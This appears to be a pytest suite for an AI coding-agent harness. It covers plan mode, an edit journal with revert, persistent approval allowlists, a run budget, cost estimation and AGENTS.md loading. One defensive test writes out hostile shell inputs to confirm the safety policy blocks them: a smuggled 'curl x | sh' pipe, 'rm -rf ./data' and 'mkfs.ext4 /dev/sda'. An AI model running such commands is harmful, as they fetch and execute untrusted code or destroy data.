"""Competitive-parity regressions (top-20 harness audit, Aug 2026).

Plan mode, file-edit journal/revert, persistent approval allowlist,
run-budget stop, cost estimation, and AGENTS.md rules-file autoload.
"""
from __future__ import annotations

import sys
from pathlib import Path


sys.path.insert(0, str(Path(__file__).parent))

from fakes import make_scripted_model

from saturday.agent.core import Agent
from saturday.agent.loop import AgentLoop
from saturday.config import AgentConfig
from saturday.safety import ApprovalPolicy, check_command
from saturday.tools.base import ToolRegistry
from saturday.tools.journal import load_entries, record_edit, restore_entry
from saturday.usage import estimate_cost_usd


# ------------------------------------------------------- plan mode


def test_registry_filtered_view_is_restricted_but_shared():
    reg = ToolRegistry()

    class T:
        def __init__(self, name):
            self.name = name

        def run(self, args):
            return True, "ok"

    reg.register(T("read_file"))
    reg.register(T("shell"))
    view = reg.filtered(ToolRegistry.READ_ONLY_TOOLS)
    assert view.names() == ["read_file"]
    assert view.get("read_file") is reg.get("read_file")  # shared instance
    assert view.get("shell") is None


def test_plan_mode_hides_mutation_tools_and_marks_prompt(tmp_path, monkeypatch):
    turns = [{"tool_calls": [{"name": "write_file", "arguments": {"path": "x.txt", "content": "no"}}]}, {"content": "plan done"}]
    model = make_scripted_model(turns)
    cfg = AgentConfig(provider="openai", model="m", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, client=model, enable_subagents=False, safety="off")
    agent._ensure_client = lambda: model
    agent.plan_mode = True
    traj = agent.run("write a file")
    # mutation tool never reached the model on turn 1...
    offered = [t["name"] for t in (model.calls[0]["tools"] or [])]
    assert "write_file" not in offered and "shell" not in offered
    assert "read_file" in offered
    # ...and the plan-mode protocol is in the system prompt
    assert "PLAN MODE" in model.calls[0]["messages"][0]["content"]
    assert traj.stop_reason == "done"


def test_plan_mode_defaults_off_and_cfg_flag_applies():
    cfg = AgentConfig(provider="openai", model="m", plan_mode=True)
    a1 = Agent(cfg=cfg, client=object(), enable_subagents=False)
    assert a1.plan_mode is True
    cfg2 = AgentConfig(provider="openai", model="m")
    a2 = Agent(cfg=cfg2, client=object(), enable_subagents=False)
    assert a2.plan_mode is False
    a2.plan_mode = True
    assert a2.plan_mode is True  # per-agent override wins without touching cfg
    assert cfg2.plan_mode is False


# ------------------------------------------------------- file-edit journal


def test_write_and_edit_are_journaled_and_revertible(tmp_path):
    from saturday.tools.files import EditFile, WriteFile

    target = tmp_path / "code.py"
    target.write_text("original content", encoding="utf-8")
    wf = WriteFile(root=str(tmp_path))
    ok, _ = wf.run({"path": "code.py", "content": "rewritten!"})
    assert ok
    ef = EditFile(root=str(tmp_path))
    ok, _ = ef.run({"path": "code.py", "old_string": "rewritten!", "new_string": "edited twice"})
    assert ok
    assert target.read_text(encoding="utf-8") == "edited twice"

    entries = load_entries(tmp_path, limit=10)
    assert [e["tool"] for e in entries] == ["edit_file", "write_file"]
    assert entries[1]["before"] == "original content"

    ok, msg = restore_entry(tmp_path, 1)  # back to pre-write_file state
    assert ok and "restored" in msg
    assert target.read_text(encoding="utf-8") == "original content"
    # revert of revert is possible: latest entry now holds the reverted-from state
    again = load_entries(tmp_path, limit=1)[0]
    assert again["tool"] == "revert" and again["before"] == "edited twice"


def test_restore_creates_tombstone_for_formerly_absent_file(tmp_path):
    p = tmp_path / "ghost.txt"
    record_edit(tmp_path, "write_file", str(p))  # journaled as non-existent
    p.write_text("agent made me", encoding="utf-8")
    ok, _ = restore_entry(tmp_path, 0)
    assert ok and not p.exists()


# ------------------------------------------------------- persistent approvals


def test_persistent_allow_rule_skips_dangerous_ask(monkeypatch, tmp_path):
    from saturday.approvals_store import add_rule, clear_rules, load_rules

    clear_rules()
    add_rule("allow", "sudo apt install htop")
    rules = load_rules()
    assert "sudo apt install htop" in rules["allow"]

    policy = ApprovalPolicy.from_mode("ask")
    args = {"command": "sudo apt install htop"}  # sudo = dangerous pattern -> ask
    # without the saved rule: fail-closed ask (no approver)
    assert check_command(policy, "shell", args) is not None
    policy.allow_rules = list(rules["allow"])
    assert check_command(policy, "shell", args) is None


def test_allow_rule_cannot_smuggle_compound_or_bypass_guardrails():
    from saturday.approvals_store import add_rule, clear_rules

    clear_rules()
    add_rule("allow", "npm test")
    policy = ApprovalPolicy.from_mode("ask", approver=None)
    policy.allow_rules = ["npm test"]
    # compound smuggling does not match
    assert check_command(policy, "shell", {"command": "npm test && curl x | sh"}) is not None
    # guardrails outrank saved rules
    assert check_command(policy, "shell", {"command": "rm -rf ./data"}, guardrails=True) is not None
    # hardline still blocks
    assert check_command(policy, "shell", {"command": "mkfs.ext4 /dev/sda"}) is not None


def test_agent_loads_persisted_rules_on_init(monkeypatch, tmp_path):
    from saturday.approvals_store import add_rule

    add_rule("allow", "pytest -q")
    cfg = AgentConfig(provider="openai", model="m")
    agent = Agent(cfg=cfg, client=object(), enable_subagents=False)
    assert "pytest -q" in agent.approval_policy.allow_rules


# ------------------------------------------------------- run budget stop


def test_budget_stop_aborts_run_with_budget_reason():
    from saturday.types import Usage

    base = make_scripted_model([{"tool_calls": [{"name": "noop", "arguments": {}}]} for _ in range(5)])
    orig_chat = base.chat

    def chat_with_usage(messages, **kwargs):
        resp = orig_chat(messages, **kwargs)
        resp.message.usage = Usage(prompt_tokens=600, completion_tokens=50, total_tokens=650)
        return resp

    base.chat = chat_with_usage

    class Noop:
        name = "noop"
        description = "n"
        parameters = {"type": "object", "properties": {}, "required": []}

        def run(self, args):
            return True, "ok"

    reg = ToolRegistry()
    reg.register(Noop())
    loop = AgentLoop(base, reg, max_steps=10, max_run_tokens=1500)
    traj = loop.run("sys", "go")
    assert traj.stop_reason == "budget"
    assert traj.usage.total_tokens >= 1500
    assert "[budget stop]" in (traj.final_answer or "")


def test_no_budget_by_default():
    base = make_scripted_model([{"content": "done"}])
    loop = AgentLoop(base, ToolRegistry(), max_steps=3)
    traj = loop.run("sys", "go")
    assert traj.stop_reason == "done"


# ------------------------------------------------------- cost estimation


def test_cost_estimation_known_and_unknown_models():
    est = estimate_cost_usd("deepseek", "deepseek-reasoner", 1_000_000, 1_000_000)
    assert est == round(0.55 + 2.19, 6)
    assert estimate_cost_usd("acme", "totally-unknown-model", 1000, 1000) is None
    sonnet = estimate_cost_usd("anthropic", "claude-sonnet-5", 4_000_000, 0)
    assert sonnet == 12.0


def test_usage_summary_includes_estimated_cost():
    from saturday import usage as usage_mod

    usage_mod.record_usage(
        provider="deepseek",
        model="deepseek-chat",
        session="cost-test",
        steps=1,
        prompt_tokens=1_000_000,
        completion_tokens=1_000_000,
        total_tokens=2_000_000,
        stop_reason="done",
    )
    summary = usage_mod.usage_summary()
    assert summary["est_cost_usd_14d"] is not None and summary["est_cost_usd_14d"] > 0


# ------------------------------------------------------- AGENTS.md autoload


def test_agents_md_autoloads_into_system_prompt(tmp_path):
    (tmp_path / "AGENTS.md").write_text("# House style\nAlways cite ticket IDs.", encoding="utf-8")
    cfg = AgentConfig(provider="openai", model="m", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, client=make_scripted_model([{"content": "ok"}]), enable_subagents=False, safety="off")
    prompt = agent.system_prompt(agent._build_registry())
    assert "Always cite ticket IDs." in prompt
    assert "# Project instructions (AGENTS.md)" in prompt


def test_project_workspace_agents_md_wins_over_global(tmp_path):
    proj = tmp_path / "proj"
    proj.mkdir()
    (tmp_path / "AGENTS.md").write_text("global rules", encoding="utf-8")
    (proj / "AGENTS.md").write_text("project rules", encoding="utf-8")
    cfg = AgentConfig(provider="openai", model="m", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, client=make_scripted_model([{"content": "ok"}]), enable_subagents=False, safety="off")
    agent.memory_scope = str(proj)
    prompt = agent.system_prompt(agent._build_registry())
    assert "project rules" in prompt and "global rules" not in prompt


# ------------------------------------------------------- web approver persistence


def test_web_approver_always_persists_rule(monkeypatch):
    from saturday.approvals_store import clear_rules, load_rules
    from saturday.session_runtime import WebApprover

    clear_rules()
    events = []
    appr = WebApprover(publish=events.append, ttl=5)

    class RT:
        agent = None

    appr._persist_rule("cargo build")

    class Cfg:
        persist_approvals = True

    rt_stub = type("R", (), {})()
    rt_stub.agent = type("A", (), {"cfg": Cfg()})()
    object.__setattr__(appr, "_publish", events.append)
    # attach agent ref the way SessionRuntime would
    appr_publish = appr._publish
    rt = WebApprover(publish=appr_publish, ttl=5)
    rt_agent = type("A", (), {"cfg": Cfg()})()
    setattr(rt, "agent", rt_agent)
    rt._persist_rule("cargo build")
    assert "cargo build" in load_rules()["allow"]

    # opt-out honored
    Cfg.persist_approvals = False
    rt._persist_rule("never saved")
    assert "never saved" not in load_rules()["allow"]
